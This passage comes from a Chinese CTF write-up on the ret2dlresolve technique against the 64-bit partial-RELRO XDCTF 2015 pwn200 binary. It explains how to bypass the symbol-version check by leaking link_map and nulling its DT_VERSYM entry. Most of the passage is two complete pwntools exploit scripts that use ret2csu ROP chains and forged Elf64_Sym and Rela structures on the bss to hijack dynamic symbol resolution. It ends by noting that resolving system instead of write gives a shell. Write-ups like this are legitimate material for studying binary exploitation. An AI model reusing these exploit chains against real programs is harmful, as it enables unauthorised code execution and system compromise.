/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/<span class="number">2015</span>-xdctf-pwn200/<span class="number">64</span>/partial-relro/main_partial_relro_64</span><br><span class="line">    <span class="number">0x7fe00a97e000</span>     <span class="number">0x7fe00ab65000</span> r-xp   <span class="number">1e7000</span> <span class="number">0</span>      /lib/x86_64-linux-gnu/libc<span class="number">-2.27</span>.so</span><br><span class="line">    <span class="number">0x7fe00ab65000</span>     <span class="number">0x7fe00ad65000</span> ---p   <span class="number">200000</span> <span class="number">1e7000</span> /lib/x86_64-linux-gnu/libc<span class="number">-2.27</span>.so</span><br><span class="line">    <span class="number">0x7fe00ad65000</span>     <span class="number">0x7fe00ad69000</span> r--p     <span class="number">4000</span> <span class="number">1e7000</span> /lib/x86_64-linux-gnu/libc<span class="number">-2.27</span>.so</span><br><span class="line">    <span class="number">0x7fe00ad69000</span>     <span class="number">0x7fe00ad6b000</span> rw-p     <span class="number">2000</span> <span class="number">1</span>eb000 /lib/x86_64-linux-gnu/libc<span class="number">-2.27</span>.so</span><br><span class="line">    <span class="number">0x7fe00ad6b000</span>     <span class="number">0x7fe00ad6f000</span> rw-p     <span class="number">4000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7fe00ad6f000</span>     <span class="number">0x7fe00ad96000</span> r-xp    <span class="number">27000</span> <span class="number">0</span>      /lib/x86_64-linux-gnu/ld<span class="number">-2.27</span>.so</span><br><span class="line">    <span class="number">0x7fe00af79000</span>     <span class="number">0x7fe00af7b000</span> rw-p     <span class="number">2000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7fe00af96000</span>     <span class="number">0x7fe00af97000</span> r--p     <span class="number">1000</span> <span class="number">27000</span>  /lib/x86_64-linux-gnu/ld<span class="number">-2.27</span>.so</span><br><span class="line">    <span class="number">0x7fe00af97000</span>     <span class="number">0x7fe00af98000</span> rw-p     <span class="number">1000</span> <span class="number">28000</span>  /lib/x86_64-linux-gnu/ld<span class="number">-2.27</span>.so</span><br><span class="line">    <span class="number">0x7fe00af98000</span>     <span class="number">0x7fe00af99000</span> rw-p     <span class="number">1000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7fffb43a9000</span>     <span class="number">0x7fffb43cb000</span> rw-p    <span class="number">22000</span> <span class="number">0</span>      [<span class="built_in">stack</span>]</span><br><span class="line">    <span class="number">0x7fffb43fb000</span>     <span class="number">0x7fffb43fe000</span> r--p     <span class="number">3000</span> <span class="number">0</span>      [vvar]</span><br><span class="line">    <span class="number">0x7fffb43fe000</span>     <span class="number">0x7fffb4400000</span> r-xp     <span class="number">2000</span> <span class="number">0</span>      [vdso]</span><br><span class="line"><span class="number">0xffffffffff600000</span> <span class="number">0xffffffffff601000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      [vsyscall]</span><br></pre></td></tr></table></figure>
+
+<p>那我们能不能想办法让它位于映射的内存中呢。估计有点难</p>
+<ul>
+<li>bss 的起始地址为 0x601050，那么索引值最小为 (0x601050-0x400398)/24=87517，即 0x4003f6 + 87517*2 = 0x42afb0</li>
+<li>bss 可以最大使用的地址为 0x601fff，对应的索引值为 (0x601fff-0x400398)/24=87684，即 0x4003f6 + 87684*2 = 0x42b0fe</li>
+</ul>
+<p>显然都在非映射的内存区域。因此，我们得考虑考虑其它办法。通过阅读 dl_fixup 的代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取符号的版本信息</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX(DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *vernum </span>= (<span class="keyword">const</span> <span class="keyword">void</span> *)D_PTR(l, l_info[VERSYMIDX(DT_VERSYM)]);</span><br><span class="line">    ElfW(Half) ndx = vernum[ELFW(R_SYM)(reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">    version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">    <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">        version = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们发现，如果把 l-&gt;l_info[VERSYMIDX(DT_VERSYM)] 设置为  NULL，那程序就不会执行下面的代码，版本号就为 NULL，就可以正常执行代码。但是，这样的话，我们就需要知道 link_map 的地址了。  GOT 表的第 0 项（本例中 0x601008）存储的就是 link_map 的地址。</p>
+<p>因此，我们可以</p>
+<ul>
+<li>泄露该处的地址</li>
+<li>将 l-&gt;l_info[VERSYMIDX(DT_VERSYM)] 设置为 NULL</li>
+<li> 最后执行利用脚本即可</li>
+</ul>
+<p>通过汇编代码，我们可以看出 l-&gt;l_info[VERSYMIDX(DT_VERSYM)] 的偏移为 0x1c8</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7fa4b09f7ea1</span> &lt;_dl_fixup+<span class="number">97</span>&gt;     mov    rax, qword ptr [r10 + <span class="number">0x1c8</span>]</span><br><span class="line">  <span class="number">0x7fa4b09f7ea8</span> &lt;_dl_fixup+<span class="number">104</span>&gt;    <span class="keyword">xor</span>    r8d, r8d</span><br><span class="line">  <span class="number">0x7fa4b09f7eab</span> &lt;_dl_fixup+<span class="number">107</span>&gt;    test   rax, rax</span><br><span class="line">  <span class="number">0x7fa4b09f7eae</span> &lt;_dl_fixup+<span class="number">110</span>&gt;    je     _dl_fixup+<span class="number">156</span> &lt;_dl_fixup+<span class="number">156</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<p>除了之前在32位中提到的调整数据写入地址之外还可以让程序不进入if (l-&gt;l_info[VERSYMIDX (DT_VERSYM)]  != NULL)而直接向下执行也是可以的；但是这样就需要泄露（write）出link_map的首结点地址，即泄露0x601008处存放的地址：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.got.plt:<span class="number">0000000000601000</span> _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC</span><br><span class="line">.got.plt:<span class="number">0000000000601008</span> qword_601008    dq <span class="number">0</span>                    ; DATA XREF: sub_400500↑r</span><br><span class="line">.got.plt:<span class="number">0000000000601010</span> qword_601010    dq <span class="number">0</span>                    ; DATA XREF: sub_400500+<span class="number">6</span>↑r</span><br><span class="line">.got.plt:<span class="number">0000000000601018</span> off_601018      dq offset write         ; DATA XREF: _write↑r</span><br><span class="line">.got.plt:<span class="number">0000000000601020</span> off_601020      dq offset <span class="built_in">strlen</span>        ; DATA XREF: _strlen↑r</span><br><span class="line">.got.plt:<span class="number">0000000000601028</span> off_601028      dq offset setbuf        ; DATA XREF: _setbuf↑r</span><br><span class="line">.got.plt:<span class="number">0000000000601030</span> off_601030      dq offset read          ; DATA XREF: _read↑r</span><br><span class="line">.got.plt:<span class="number">0000000000601030</span> _got_plt        ends</span><br></pre></td></tr></table></figure>
+
+<p>通过汇编代码可以看出 l-&gt;l_info[VERSYMIDX(DT_VERSYM)] 的偏移为0x1c8</p>
+<p><img src="C:\Users\wqf\AppData\Roaming\Typora\typora-user-images\image-20220702223316673.png" alt="image-20220702223316673"></p>
+<p>所以泄露地址后将 l-&gt;l_info[VERSYMIDX(DT_VERSYM)] 设置为NULL即可绕过此if语句，exp如下（添加的内容在###之间）</p>
+<blockquote>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://forum.90sec.com/t/topic/260">https://forum.90sec.com/t/topic/260</a></p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=process(<span class="string">&#x27;./main_partial_relro_64&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./main_partial_relro_64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#64位寄存器传参：rdi, rsi, rdx, rcx, r8, r9。</span></span><br><span class="line"><span class="comment">#此程序中没有pop rdx的gadget</span></span><br><span class="line"><span class="comment">#ret2csu调用read</span></span><br><span class="line">bss_addr=elf.bss()</span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">new_stack=bss_addr+<span class="number">0x200</span></span><br><span class="line">pop_rbp=<span class="number">0x00000000004005b8</span></span><br><span class="line">pop_rdi=<span class="number">0x00000000004007a3</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x00000000004007a1</span></span><br><span class="line">leave_ret=<span class="number">0x000000000040066c</span></span><br><span class="line">libc_csu_init_gadget_start1_addr=<span class="number">0x40079A</span></span><br><span class="line">libc_csu_init_gadget_start2_addr=<span class="number">0x400780</span></span><br><span class="line"></span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">vuln_addr=elf.sym[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line"></span><br><span class="line">plt0=<span class="number">0x400500</span></span><br><span class="line">rel_plt=elf.get_section_by_name(<span class="string">&#x27;.rela.plt&#x27;</span>).header.sh_addr</span><br><span class="line">dynsym=elf.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class="line"></span><br><span class="line"><span class="comment">#  Elf64_Sym &lt;offset aWrite - offset byte_400398, 12h, 0, 0, 0, 0&gt; ; &quot;write&quot;</span></span><br><span class="line"><span class="comment">#LOAD:00000000004003D5 aWrite          db &#x27;write&#x27;,0            ; DATA XREF: LOAD:00000000004002D8↑o</span></span><br><span class="line">fake_st_name=<span class="number">0x4003D5</span>-<span class="number">0x400398</span></span><br><span class="line">fake_st_info=<span class="number">0x12</span></span><br><span class="line">fake_st_other=<span class="number">0x0</span></span><br><span class="line">fake_st_shndx=<span class="number">0x0</span></span><br><span class="line">fake_st_value=<span class="number">0x0</span></span><br><span class="line">fake_st_size=<span class="number">0x0</span></span><br><span class="line">fake_write_sym=p32(fake_st_name)+p8(fake_st_info)+p8(fake_st_other)+p16(fake_st_shndx)+p64(fake_st_value)+p64(fake_st_size)</span><br><span class="line">fake_write_sym_addr=new_stack+<span class="number">0x10</span></span><br><span class="line">align=<span class="number">0x18</span>-((fake_write_sym_addr-dynsym)&amp;<span class="number">0xf</span>)</span><br><span class="line">fake_write_sym_addr+=align</span><br><span class="line"></span><br><span class="line">fake_r_offset=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">dynsym_index=(fake_write_sym_addr-dynsym)/<span class="number">0x18</span></span><br><span class="line">fake_r_info=dynsym_index&lt;&lt;<span class="number">32</span>|<span class="number">7</span></span><br><span class="line">fake_r_addend=<span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">fake_write_rela=p64(fake_r_offset)+p64(fake_r_info)+p64(fake_r_addend)</span><br><span class="line">fake_write_rela_addr=new_stack+<span class="number">0x10</span>+<span class="built_in">len</span>(fake_write_sym)+align</span><br><span class="line">fake_reloc_arg=(fake_write_rela_addr-rel_plt)/<span class="number">0x18</span></span><br><span class="line"></span><br><span class="line"><span class="comment">####################################################</span></span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">payload0=<span class="number">120</span>*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload0+=p64(libc_csu_init_gadget_start1_addr)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(write_got)+p64(<span class="number">1</span>)+p64(<span class="number">0x601008</span>)+p64(<span class="number">0x8</span>)</span><br><span class="line">payload0+=p64(libc_csu_init_gadget_start2_addr)+p64(<span class="number">0xdeadbeef</span>)*<span class="number">7</span>+p64(main_addr)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">p.send(payload0)</span><br><span class="line"></span><br><span class="line">link_map_addr=u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(link_map_addr)</span><br><span class="line">link_map_l_info_VERSYMIDX_DT_VERSYM_addr=link_map_addr+<span class="number">0x1c8</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(link_map_l_info_VERSYMIDX_DT_VERSYM_addr)</span><br><span class="line">fake_map_l_info_VERSYMIDX_DT_VERSYM=<span class="number">120</span>*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">fake_map_l_info_VERSYMIDX_DT_VERSYM+=p64(libc_csu_init_gadget_start1_addr)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(read_got)+p64(<span class="number">0</span>)+p64(link_map_l_info_VERSYMIDX_DT_VERSYM_addr)+p64(<span class="number">0x100</span>)</span><br><span class="line">fake_map_l_info_VERSYMIDX_DT_VERSYM+=p64(libc_csu_init_gadget_start2_addr)+p64(<span class="number">0xdeadbeef</span>)*<span class="number">7</span>+p64(main_addr)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(fake_map_l_info_VERSYMIDX_DT_VERSYM)</span><br><span class="line"><span class="comment">#gdb.attach(proc.pidof(p)[0],gdbscript=&quot;dir /root/ret2dlresolve/malloc/glibc/glibc-2.27/elf/&quot;)</span></span><br><span class="line">p.send(p64(<span class="number">0</span>))</span><br><span class="line"><span class="comment">#######################################################</span></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">&#x27;a&#x27;</span>*<span class="number">120</span></span><br><span class="line">payload1+=p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi_r15)+p64(new_stack)+p64(<span class="number">0xdeadbeef</span>)+p64(read_plt)     <span class="comment">#向new_stack中写入/bin/sh\x00</span></span><br><span class="line">payload1+=p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi_r15)+p64(fake_write_sym_addr)+p64(<span class="number">0xdeadbeef</span>)+p64(read_plt)+p64(main_addr) <span class="comment">#new_stack+0x10中写入fake_write_Elf64_Sym</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;/bin/sh\x00&quot;</span>.ljust(<span class="number">0x10</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">p.send(fake_write_sym)</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">&#x27;a&#x27;</span>*<span class="number">120</span>+p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi_r15)+p64(fake_write_rela_addr)+p64(<span class="number">0xdeadbeef</span>)+p64(read_plt)+p64(main_addr) <span class="comment">#0x10中写入fake_write_Elf64_rela</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line">p.send(fake_write_rela)</span><br><span class="line"></span><br><span class="line">payload3=<span class="string">&#x27;a&#x27;</span>*<span class="number">120</span>+p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi_r15)+p64(new_stack)+p64(<span class="number">0xdeadbeef</span>)+p64(plt0)+p64(fake_reloc_arg)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">p.send(payload3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\wqf\AppData\Roaming\Typora\typora-user-images\image-20220702223620586.png" alt="image-20220702223620586"></p>
+<h6 id="step4"><a href="#step4" class="headerlink" title="step4"></a>step4</h6><p>伪造dynstr，这里注意伪造的dynsym_index、fake_r_info、fake_relro_arg计算方式和32位不太相同：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=process(<span class="string">&#x27;./main_partial_relro_64&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./main_partial_relro_64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#64位寄存器传参：rdi, rsi, rdx, rcx, r8, r9。</span></span><br><span class="line"><span class="comment">#此程序中没有pop rdx的gadget</span></span><br><span class="line"><span class="comment">#ret2csu调用read</span></span><br><span class="line">bss_addr=elf.bss()</span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">new_stack=bss_addr+<span class="number">0x200</span></span><br><span class="line">pop_rbp=<span class="number">0x00000000004005b8</span></span><br><span class="line">pop_rdi=<span class="number">0x00000000004007a3</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x00000000004007a1</span></span><br><span class="line">leave_ret=<span class="number">0x000000000040066c</span></span><br><span class="line">libc_csu_init_gadget_start1_addr=<span class="number">0x40079A</span></span><br><span class="line">libc_csu_init_gadget_start2_addr=<span class="number">0x400780</span></span><br><span class="line"></span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">vuln_addr=elf.sym[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line"></span><br><span class="line">plt0=<span class="number">0x400500</span></span><br><span class="line">rel_plt=elf.get_section_by_name(<span class="string">&#x27;.rela.plt&#x27;</span>).header.sh_addr</span><br><span class="line">dynsym=elf.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class="line">dynstr=elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line"></span><br><span class="line"><span class="comment">#  Elf64_Sym &lt;offset aWrite - offset byte_400398, 12h, 0, 0, 0, 0&gt; ; &quot;write&quot;</span></span><br><span class="line"><span class="comment">#LOAD:00000000004003D5 aWrite          db &#x27;write&#x27;,0            ; DATA XREF: LOAD:00000000004002D8↑o</span></span><br><span class="line">fake_st_name=new_stack+<span class="built_in">len</span>(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)-dynstr</span><br><span class="line">fake_st_info=<span class="number">0x12</span></span><br><span class="line">fake_st_other=<span class="number">0x0</span></span><br><span class="line">fake_st_shndx=<span class="number">0x0</span></span><br><span class="line">fake_st_value=<span class="number">0x0</span></span><br><span class="line">fake_st_size=<span class="number">0x0</span></span><br><span class="line">fake_write_sym=p32(fake_st_name)+p8(fake_st_info)+p8(fake_st_other)+p16(fake_st_shndx)+p64(fake_st_value)+p64(fake_st_size)</span><br><span class="line">fake_write_sym_addr=new_stack+<span class="number">0x10</span></span><br><span class="line">align=<span class="number">0x18</span>-((fake_write_sym_addr-dynsym)&amp;<span class="number">0xf</span>)</span><br><span class="line">fake_write_sym_addr+=align</span><br><span class="line"></span><br><span class="line">fake_r_offset=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">dynsym_index=(fake_write_sym_addr-dynsym)/<span class="number">0x18</span></span><br><span class="line">fake_r_info=dynsym_index&lt;&lt;<span class="number">32</span>|<span class="number">7</span></span><br><span class="line">fake_r_addend=<span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">fake_write_rela=p64(fake_r_offset)+p64(fake_r_info)+p64(fake_r_addend)</span><br><span class="line">fake_write_rela_addr=new_stack+<span class="number">0x10</span>+<span class="built_in">len</span>(fake_write_sym)+align</span><br><span class="line">fake_reloc_arg=(fake_write_rela_addr-rel_plt)/<span class="number">0x18</span></span><br><span class="line"></span><br><span class="line"><span class="comment">####################################################</span></span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">payload0=<span class="number">120</span>*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload0+=p64(libc_csu_init_gadget_start1_addr)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(write_got)+p64(<span class="number">1</span>)+p64(<span class="number">0x601008</span>)+p64(<span class="number">0x8</span>)</span><br><span class="line">payload0+=p64(libc_csu_init_gadget_start2_addr)+p64(<span class="number">0xdeadbeef</span>)*<span class="number">7</span>+p64(main_addr)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">p.send(payload0)</span><br><span class="line"></span><br><span class="line">link_map_addr=u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(link_map_addr)</span><br><span class="line">link_map_l_info_VERSYMIDX_DT_VERSYM_addr=link_map_addr+<span class="number">0x1c8</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(link_map_l_info_VERSYMIDX_DT_VERSYM_addr)</span><br><span class="line">fake_map_l_info_VERSYMIDX_DT_VERSYM=<span class="number">120</span>*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">fake_map_l_info_VERSYMIDX_DT_VERSYM+=p64(libc_csu_init_gadget_start1_addr)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(read_got)+p64(<span class="number">0</span>)+p64(link_map_l_info_VERSYMIDX_DT_VERSYM_addr)+p64(<span class="number">0x100</span>)</span><br><span class="line">fake_map_l_info_VERSYMIDX_DT_VERSYM+=p64(libc_csu_init_gadget_start2_addr)+p64(<span class="number">0xdeadbeef</span>)*<span class="number">7</span>+p64(main_addr)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(fake_map_l_info_VERSYMIDX_DT_VERSYM)</span><br><span class="line"></span><br><span class="line">p.send(p64(<span class="number">0</span>))</span><br><span class="line"><span class="comment">#######################################################</span></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">&#x27;a&#x27;</span>*<span class="number">120</span></span><br><span class="line">payload1+=p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi_r15)+p64(new_stack)+p64(<span class="number">0xdeadbeef</span>)+p64(read_plt)     <span class="comment">#向new_stack中写入/bin/sh\x00</span></span><br><span class="line">payload1+=p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi_r15)+p64(fake_write_sym_addr)+p64(<span class="number">0xdeadbeef</span>)+p64(read_plt)+p64(main_addr) <span class="comment">#new_stack+0x10中写入fake_write_Elf64_Sym</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;/bin/sh\x00write\x00&quot;</span>.ljust(<span class="number">0x10</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">p.send(fake_write_sym)</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">&#x27;a&#x27;</span>*<span class="number">120</span>+p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi_r15)+p64(fake_write_rela_addr)+p64(<span class="number">0xdeadbeef</span>)+p64(read_plt)+p64(main_addr) <span class="comment">#0x10中写入fake_write_Elf64_rela</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line">p.send(fake_write_rela)</span><br><span class="line"></span><br><span class="line">payload3=<span class="string">&#x27;a&#x27;</span>*<span class="number">120</span>+p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi_r15)+p64(new_stack)+p64(<span class="number">0xdeadbeef</span>)+p64(plt0)+p64(fake_reloc_arg)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">p.send(payload3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\wqf\AppData\Roaming\Typora\typora-user-images\image-20220702224848912.png" alt="image-20220702224848912"></p>
+<h6 id="step5"><a href="#step5" class="headerlink" title="step5"></a>step5</h6><p>将st-&gt;name write改为system再略微调整下参数即可拿到shell</p>
